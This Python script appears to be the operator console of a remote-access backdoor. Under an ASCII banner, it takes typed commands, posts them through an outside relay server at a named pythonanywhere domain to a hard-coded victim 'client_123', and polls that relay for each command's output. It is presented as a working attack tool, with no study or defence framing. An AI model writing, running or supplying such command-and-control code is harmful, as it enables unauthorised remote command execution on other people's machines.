import os
import colorama
import requests
import time

server_domain = "https://omersaban.pythonanywhere.com/"
server_url = server_domain + '/send_command'
get_output_url = server_domain + '/get_output'
target_client = 'client_123'
current_directory = os.getcwd()

# ascii art
print(colorama.Fore.LIGHTRED_EX + """
 /$$   /$$  /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$ /$$   /$$       /$$$$$$$   /$$$$$$  /$$$$$$$$  /$$$$$$ 
| $$  | $$ /$$__  $$ /$$__  $$ /$$__  $$| $$_____/| $$$ | $$      | $$__  $$ /$$__  $$|_____ $$  /$$__  $$
| $$  | $$| $$  \ $$| $$  \__/| $$  \__/| $$      | $$$$| $$      | $$  \ $$| $$  \ $$     /$$/ | $$  \__/
| $$$$$$$$| $$$$$$$$| $$ /$$$$| $$ /$$$$| $$$$$   | $$ $$ $$      | $$  | $$| $$$$$$$$    /$$/  |  $$$$$$ 
| $$__  $$| $$__  $$| $$|_  $$| $$|_  $$| $$__/   | $$  $$$$      | $$  | $$| $$__  $$   /$$/    \____  $$
| $$  | $$| $$  | $$| $$  \ $$| $$  \ $$| $$      | $$\  $$$      | $$  | $$| $$  | $$  /$$/     /$$  \ $$
| $$  | $$| $$  | $$|  $$$$$$/|  $$$$$$/| $$$$$$$$| $$ \  $$      | $$$$$$$/| $$  | $$ /$$$$$$$$|  $$$$$$/
|__/  |__/|__/  |__/ \______/  \______/ |________/|__/  \__/      |_______/ |__/  |__/|________/ \______/ 
                                                                                                          
                                                                                                          
                                                                                                          
""")
while True:
    # commadns
    command = input(colorama.Fore.CYAN + "Enter command to send (or 'exit' to quit): ")
    if command.lower() == 'exit':
        break
    # commands to send in the format protocol
    command_to_send = {
        "target_client": target_client,
        "command": command
    }

    response = requests.post(server_url, json=command_to_send)

    while True:
        try:
            output_response = requests.get(f"{get_output_url}/{target_client}")
            output = output_response.json().get('output')
            if output:
                print(f"Output: {output}")
                break
            else:
                time.sleep(2)
        except Exception:
            print("There Was An Error.!")
            break
    else:
        print(f"Failed to send command '{command}'")
